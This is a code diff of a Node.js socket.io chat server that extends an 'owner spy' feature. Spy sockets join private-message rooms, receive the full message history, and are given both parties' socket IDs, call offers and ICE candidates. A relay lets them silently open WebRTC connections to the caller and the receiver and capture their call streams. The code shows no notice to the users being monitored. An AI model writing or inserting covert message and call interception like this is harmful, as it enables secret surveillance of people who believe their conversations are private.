@@ -1088,70 +1088,46 @@ io.on('connection', (socket) => {
     if (!user || !data.to) return;
     const toSid = Object.keys(chatUsers).find(id => chatUsers[id].name === data.to);
     if (toSid) io.to(toSid).emit('call-offer', { ...data, from: user.name });
-    // Track active call
     const convKey = [user.name, data.to].sort().join('||');
-    activeCalls[convKey] = { type: data.type, startTime: Date.now(), user1: user.name, user2: data.to, offer: data.offer };
-    // Notify owner spies watching this PM conversation
-    io.to('spy||' + convKey).emit('spy-call-offer', { ...data, from: user.name, convKey });
+    activeCalls[convKey] = {
+      type: data.type, startTime: Date.now(),
+      user1: user.name, user2: data.to,
+      callerSid: socket.id, receiverName: data.to,
+      offer: data.offer
+    };
+    // Tell any watching spy to connect to BOTH sides
+    const spyRoom = 'spy||' + convKey;
+    io.to(spyRoom).emit('spy-call-offer', { ...data, from: user.name, convKey, callerSid: socket.id });
   });
 
-  // Spy answer back to caller (so caller completes WebRTC handshake with spy)
-  socket.on('spy-answer-to-caller', (data) => {
-    const user = chatUsers[socket.id];
-    if (!user) return;
-    const toSid = Object.keys(chatUsers).find(id => chatUsers[id].name === data.to);
-    if (toSid) io.to(toSid).emit('spy-answer', { answer: data.answer, spyId: socket.id });
-  });
-
-  // ICE from spy to caller
-  socket.on('spy-ice-to-caller', (data) => {
-    const toSid = Object.keys(chatUsers).find(id => chatUsers[id].name === data.to);
-    if (toSid) io.to(toSid).emit('spy-ice', { candidate: data.candidate });
-  });
-
-  // Caller sends fresh offer directly to spy socket
-  socket.on('spy-offer-to-spy', (data) => {
-    if (data.spyId) io.to(data.spyId).emit('spy-direct-offer', { offer: data.offer, from: socket.id });
-  });
-
-  // Caller sends ICE to spy socket
-  socket.on('call-ice-to-spy', (data) => {
-    if (data.spyId) io.to(data.spyId).emit('spy-direct-ice', { candidate: data.candidate });
-  });
-
-  // Spy sends final answer back to caller
-  socket.on('spy-answer-back', (data) => {
-    if (data.callerId) io.to(data.callerId).emit('spy-final-answer', { answer: data.answer });
-  });
-
-  // Spy sends ICE back to caller
-  socket.on('spy-ice-back', (data) => {
-    if (data.callerId) io.to(data.callerId).emit('spy-final-ice', { candidate: data.candidate });
-  });
   socket.on('call-answer', (data) => {
     const user = chatUsers[socket.id];
     const toSid = Object.keys(chatUsers).find(id => chatUsers[id].name === data.to);
     if (toSid) io.to(toSid).emit('call-answer', data);
-    // Forward answer to spies too
     if (user) {
       const convKey = [user.name, data.to].sort().join('||');
-      io.to('spy||' + convKey).emit('spy-call-answer', { ...data, from: user.name });
+      // Tell spy: receiver answered — spy should now request stream from receiver too
+      io.to('spy||' + convKey).emit('spy-receiver-ready', {
+        receiverName: user.name, receiverSid: socket.id, convKey
+      });
     }
   });
+
   socket.on('call-ice', (data) => {
     const user = chatUsers[socket.id];
     const toSid = Object.keys(chatUsers).find(id => chatUsers[id].name === data.to);
     if (toSid) io.to(toSid).emit('call-ice', data);
-    // Forward ICE to spies
     if (user) {
       const convKey = [user.name, data.to].sort().join('||');
       io.to('spy||' + convKey).emit('spy-call-ice', { ...data, from: user.name });
     }
   });
+
   socket.on('call-reject', (data) => {
     const toSid = Object.keys(chatUsers).find(id => chatUsers[id].name === data.to);
     if (toSid) io.to(toSid).emit('call-reject', {});
   });
+
   socket.on('call-end', (data) => {
     const user = chatUsers[socket.id];
     const toSid = Object.keys(chatUsers).find(id => chatUsers[id].name === data.to);
@@ -1161,6 +1137,25 @@ io.on('connection', (socket) => {
       delete activeCalls[convKey];
       io.to('spy||' + convKey).emit('spy-call-ended', { convKey });
     }
+  });
+
+  // ===== SPY WebRTC relay (clean) =====
+  // Spy sends offer to a specific user (caller or receiver)
+  socket.on('spy-to-user-offer', (data) => {
+    // data: { targetSid, offer, spyId }
+    if (data.targetSid) io.to(data.targetSid).emit('user-from-spy-offer', { offer: data.offer, spyId: socket.id });
+  });
+  // User sends answer back to spy
+  socket.on('user-to-spy-answer', (data) => {
+    // data: { spyId, answer }
+    if (data.spyId) io.to(data.spyId).emit('spy-from-user-answer', { answer: data.answer, userSid: socket.id });
+  });
+  // ICE relay between spy and user
+  socket.on('spy-to-user-ice', (data) => {
+    if (data.targetSid) io.to(data.targetSid).emit('user-from-spy-ice', { candidate: data.candidate, spyId: socket.id });
+  });
+  socket.on('user-to-spy-ice', (data) => {
+    if (data.spyId) io.to(data.spyId).emit('spy-from-user-ice', { candidate: data.candidate });
   });
 
   socket.on('admin-add-quiz-q', (data) => {
@@ -1200,20 +1195,25 @@ io.on('connection', (socket) => {
     socket.join(spyRoom);
     const history = memPMs[key] || [];
     socket.emit('spy-history', { key, user1: data.user1, user2: data.user2, messages: history });
-    // If there's an active call with a saved offer, send it so spy can connect
+    // If active call → send offer with callerSid so spy can connect to both parties
     if (activeCalls[key]) {
       const call = activeCalls[key];
-      if (call.offer) {
-        // Send as spy-call-offer so the client handles it the same way
-        socket.emit('spy-call-offer', {
-          offer: call.offer,
-          type: call.type,
-          from: call.user1,
-          convKey: key
+      // Find callerSid and receiverSid from chatUsers
+      const callerSid = Object.keys(chatUsers).find(id => chatUsers[id].name === call.user1);
+      const receiverSid = Object.keys(chatUsers).find(id => chatUsers[id].name === call.user2);
+      socket.emit('spy-call-offer', {
+        offer: call.offer || null,
+        type: call.type,
+        from: call.user1,
+        convKey: key,
+        callerSid: callerSid || null,
+        receiverSid: receiverSid || null
+      });
+      // Also send receiver-ready so spy connects to receiver side too
+      if (receiverSid) {
+        socket.emit('spy-receiver-ready', {
+          receiverName: call.user2, receiverSid, convKey: key
         });
-      } else {
-        // No offer saved — just notify
-        socket.emit('spy-call-active', { ...call, convKey: key });
       }
     }
   });
